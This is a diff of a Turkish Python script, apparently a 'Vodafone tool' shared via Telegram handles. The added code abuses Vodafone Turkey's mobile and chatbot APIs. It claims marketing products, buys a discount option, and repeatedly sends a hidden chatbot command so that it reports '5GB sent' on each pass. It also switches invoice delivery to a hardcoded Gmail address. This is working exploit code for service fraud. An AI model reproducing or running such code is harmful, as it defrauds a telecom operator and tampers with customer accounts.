@@ -38,12 +38,18 @@ import webbrowser
 webbrowser.open('https://t.me/thomashack')
 print('\x1b[32mİzin Verildi ✅')
 time.sleep(2)
-
+from datetime import datetime
 import time
 import os
 B = '\x1b[38;5;208m'  
 BYellow = '\x1b[1;33m'
-
+	
+from datetime import datetime
+current_time = datetime.now()
+expiry_time = datetime.strptime('''2024-02-25 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
+if current_time > expiry_time:
+    print(' @phpmehmet tarafından bakıma alındı')
+    exit()
 
 
 
@@ -115,7 +121,7 @@ memo='''
 %%%%%%%%%%##*+++====---::::::........:-+%%+::-+%%%%%%%@
 %%%%%%%%@@@@%%%##**+=====------:::::::-=#%%*++*#%%%%%%@
                  < MEHMET VODAFONE TOOL V1.2 >
-              TLE : @PHPMEHMET / @THOMASHACK
+              TLE : @PHPMEHMET / @THOMASHACKK
 
  \033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬MEHMET▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''                                               
 print(memo)                                                            
@@ -262,4 +268,77 @@ if sec == '1':
         
         al_data = {
             'clientKey': 'AC491770-B16A-4273-9CE7-CA790F63365E',
-            'clientVersion': '
+            'clientVersion': '16.8.3',
+            'code': '',
+            'identifier': c4,
+            'interactionId': c3,
+            'language': 'tr',
+            'operatingSystem': 'android' 
+        }
+        
+        al_url = f'https://m.vodafone.com.tr/squat/updateSquatMarketingProduct?sid={proid}'
+        al = requests.post(al_url, headers=o_head, json=al_data).json()
+        
+        print('\x1b[32m✅' + c1)
+        print(' Eğer Varsa İndirim Kodunuz:', c2)
+        
+        gg = input('\x1b[45mKoda Devam etmek için \'h\' yaz: \x1b[0m').lower()
+        if gg == 'h':
+            print('Seceneklere Yönlendiriyorum')
+        else:
+            print('yanlış yazdin')
+    except:
+        pass
+    print('\x1b[32m✅ Başarılı (Lütfen fazla kullanmayın)\x1b[0m')
+    time.sleep(3)
+
+if sec == '2':
+    url2 = 'https://m.vodafone.com.tr/maltgtwaycbu/api/'
+    print('\x1b[42m ⏳ İndirim Yapılıyor\x1b[0m')
+    data3 = {
+        'method': 'buyOption',
+        'sid': proid,
+        'id': '30146',
+        'interfaceId': '',
+        'checkTopup': 'false' 
+    }
+    response_x = requests.post(url2, headers=headers, data=data3).json()
+    sonuc = response_x['result']['result']
+    
+    if sonuc == 'SUCCESS':
+        print('\x1b[42m 〽️ Fatura İndirimi Yapıldı✅\x1b[0m')
+    else:
+        print('\x1b[41m[x] ' + response_x['result']['resultDesc'] + '\x1b[0m')
+        time.sleep(3)
+
+if sec == '3':
+    url2 = 'https://m.vodafone.com.tr/maltgtwaycbu/api?method=startConversation'
+    dat = f'sid={proid}&ptag=tobi_screen&welcomeMessage='
+    tobi = requests.post(url2, headers=headers, data=dat).json()['conversation']['identifier']['id']
+    tob = f'https://tobi.vodafone.com.tr/chatbot/ui?sid={proid}&key={tobi}'
+    webbrowser.open(tob)
+    time.sleep(3)
+    ilkmsj = requests.get(f'https://tobi.vodafone.com.tr/chatbot/api?message=_hide_shop_QR_shopidR088167_dealeridR088167&method=sendMessage&sid={proid}').json()
+    d1 = ilkmsj['result']['result']
+    if d1 == 'SUCCESS':
+        print('\x1b[44m[+] Sohbet Başlatıldı\x1b[0m')
+        time.sleep(13)
+    else:
+        print('×Hata')
+tob_url = f'https://tobi.vodafone.com.tr/chatbot/api?sid={proid}&method=changeTobiInvoiceDeliveryMethod&email=salababam%40gmail.com&type=EMAIL'
+istekx = requests.get(tob_url).json()
+d7 = istekx['result']['result']
+if d7 == 'SUCCESS':
+    print('')
+else:
+    print('×Hata')
+adet = int(input('\x1b[45m[+] Kaç Adet Gönderilsin: \x1b[0m'))
+print('')
+for _ in range(adet):
+    tob_url2 = requests.get(f'https://tobi.vodafone.com.tr/chatbot/api?method=sendMessage&sid={proid}&message=_hide_CHANGE_EMAIL_SUCCESS').json()
+    d6 = tob_url2['result']['result']
+    if d6 == 'SUCCESS':
+        print('\x1b[1;32m 5GB Gönderildi✅\x1b[0m')
+    else:
+        print('×Hata')
+    time.sleep(3)
